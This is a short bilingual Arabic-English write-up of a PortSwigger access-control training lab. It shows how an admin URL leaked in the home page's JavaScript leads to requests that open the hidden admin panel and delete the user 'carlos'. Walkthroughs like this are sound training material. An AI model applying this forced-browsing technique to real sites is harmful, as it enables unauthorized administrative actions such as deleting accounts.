# Lab : Unprotected admin functionality with unpredictable URL

https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality-with-unpredictable-url

- الفكره من الLab ده ان في source code الخاص ب home page كود JavaScript  اما احلله اكتشف انه خاص ب admin اشوف الurl الunpredictable واعمل delete ل carlos

```bash
1. GET /admin-g1mdes

2. GET /admin-g1mdes/delete?username=carlos

3.var isAdmin = false;
if (isAdmin) {
   var topLinksTag = document.getElementsByClassName("top-links")[0];
   var adminPanelTag = document.createElement('a');
   adminPanelTag.setAttribute('href', '**/admin-g1mdes**');
   adminPanelTag.innerText = 'Admin panel';
   topLinksTag.append(adminPanelTag);
   var pTag = document.createElement('p');
   pTag.innerText = '|';
   topLinksTag.appendChild(pTag);
```
